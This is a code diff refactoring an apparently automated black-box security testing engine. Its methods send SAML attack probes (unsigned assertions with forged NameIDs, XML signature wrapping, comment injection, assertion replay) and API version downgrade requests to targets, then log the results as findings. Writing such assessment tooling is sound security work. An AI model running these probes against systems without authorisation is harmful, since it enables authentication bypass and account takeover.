                            ("session", "token", "authenticated", "welcome", "dashboard", "redirect")):
@@ -6473,7 +6488,7 @@ class PureBlackBoxEngine:
                                              reasons=[f"saml_unsigned_accepted:{path}"],
                                              metrics={"technique": "saml_unsigned_assertion",
                                                       "path": path,
-                                                      "status": result.status_code,
+                                                      "status": result.status,
                                                       "attack": "unsigned_response_with_forged_nameid"})
             except Exception:
                 pass
@@ -6501,10 +6516,10 @@ class PureBlackBoxEngine:
         encoded_xsw = _b64.b64encode(saml_xsw.encode()).decode()
         for path in saml_paths:
             try:
-                result = await sess.call("POST", path,
-                                         data=f"SAMLResponse={encoded_xsw}",
-                                         headers={"Content-Type": "application/x-www-form-urlencoded"})
-                if result.status_code and result.status_code in (200, 302):
+                result = await sess.raw("POST", path, label=hyp,
+                                         json_body=f"SAMLResponse={encoded_xsw}",
+                                         extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if result.status and result.status in (200, 302):
                     body = getattr(result, "text", "")
                     if any(kw in body.lower() for kw in
                            ("session", "token", "authenticated", "welcome", "dashboard")):
@@ -6514,7 +6529,7 @@ class PureBlackBoxEngine:
                                              reasons=[f"saml_xsw_accepted:{path}"],
                                              metrics={"technique": "xml_signature_wrapping",
                                                       "path": path,
-                                                      "status": result.status_code,
+                                                      "status": result.status,
                                                       "attack": "xsw_dual_assertion"})
             except Exception:
                 pass
@@ -6536,10 +6551,10 @@ class PureBlackBoxEngine:
         encoded_comment = _b64.b64encode(saml_comment.encode()).decode()
         for path in saml_paths:
             try:
-                result = await sess.call("POST", path,
-                                         data=f"SAMLResponse={encoded_comment}",
-                                         headers={"Content-Type": "application/x-www-form-urlencoded"})
-                if result.status_code and result.status_code in (200, 302):
+                result = await sess.raw("POST", path, label=hyp,
+                                         json_body=f"SAMLResponse={encoded_comment}",
+                                         extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if result.status and result.status in (200, 302):
                     body = getattr(result, "text", "")
                     if "admin" in body.lower() and "evil" not in body.lower():
                         return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "critical",
@@ -6555,14 +6570,14 @@ class PureBlackBoxEngine:
         # Replay attack
         for path in saml_paths:
             try:
-                replay_result = await sess.call("POST", path,
-                                                data=f"SAMLResponse={encoded_saml}",
-                                                headers={"Content-Type": "application/x-www-form-urlencoded"})
-                if replay_result.status_code and replay_result.status_code in (200, 302):
-                    replay2 = await sess.call("POST", path,
-                                              data=f"SAMLResponse={encoded_saml}",
-                                              headers={"Content-Type": "application/x-www-form-urlencoded"})
-                    if replay2.status_code and replay2.status_code in (200, 302):
+                replay_result = await sess.raw("POST", path, label=hyp,
+                                                json_body=f"SAMLResponse={encoded_saml}",
+                                                extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if replay_result.status and replay_result.status in (200, 302):
+                    replay2 = await sess.raw("POST", path, label=hyp,
+                                              json_body=f"SAMLResponse={encoded_saml}",
+                                              extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
+                    if replay2.status and replay2.status in (200, 302):
                         return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
                                              f"SAML replay: same assertion accepted twice at {path}.",
                                              reasons=[f"saml_replay:{path}"],
@@ -6579,20 +6594,20 @@ class PureBlackBoxEngine:
         if not self._enable_api_version_downgrade:
             return None
         hyp = "PBB-APIVER"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         import re as _rmod
         version_re = _rmod.compile(r'/v(\d+)/')
         versioned_ops = []
-        for op in self.brief.operations[:10]:
-            path = op.get("path", "")
+        for op in list(self.brief.operations.values())[:10]:
+            path = op.path
             m = version_re.search(path)
             if m:
                 versioned_ops.append((path, int(m.group(1)), m.start(), m.end()))
         if not versioned_ops:
-            for op in self.brief.operations[:3]:
-                path = op.get("path", "")
+            for op in list(self.brief.operations.values())[:3]:
+                path = op.path
                 for prefix in ["/api/v2/", "/api/v3/", "/v2/", "/v3/"]:
                     if path.startswith(prefix):
                         versioned_ops.append((path, int(prefix[-2]), 0, len(prefix)))
@@ -6601,20 +6616,20 @@ class PureBlackBoxEngine:
             for older_ver in range(current_ver - 1, 0, -1):
                 downgraded_path = original_path[:start] + f"/v{older_ver}/" + original_path[end:]
                 try:
-                    result = await sess.call("GET", downgraded_path)
-                    if result.status_code and result.status_code in (200, 201):
-                        current_result = await sess.call("GET", original_path)
-                        current_needs_auth = current_result.status_code in (401, 403)
+                    result = await sess.raw("GET", downgraded_path, label=hyp)
+                    if result.status and result.status in (200, 201):
+                        current_result = await sess.raw("GET", original_path, label=hyp)
+                        current_needs_auth = current_result.status in (401, 403)
                         if current_needs_auth:
                             return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "critical",
-                                                 f"API version downgrade: {original_path} requires auth (HTTP {current_result.status_code}) "
-                                                 f"but {downgraded_path} returns HTTP {result.status_code} without auth.",
+                                                 f"API version downgrade: {original_path} requires auth (HTTP {current_result.status}) "
+                                                 f"but {downgraded_path} returns HTTP {result.status} without auth.",
                                                  reasons=[f"apiver_downgrade:{downgraded_path}"],
                                                  metrics={"technique": "api_version_downgrade",
                                                           "current_path": original_path,
                                                           "downgraded_path": downgraded_path,
-                                                          "current_status": current_result.status_code,
-                                                          "downgraded_status": result.status_code})
+                                                          "current_status": current_result.status,
+                                                          "downgraded_status": result.status})
                 except Exception:
                     pass
         return self._finding(hyp, Verdict.RULED_OUT, "medium",
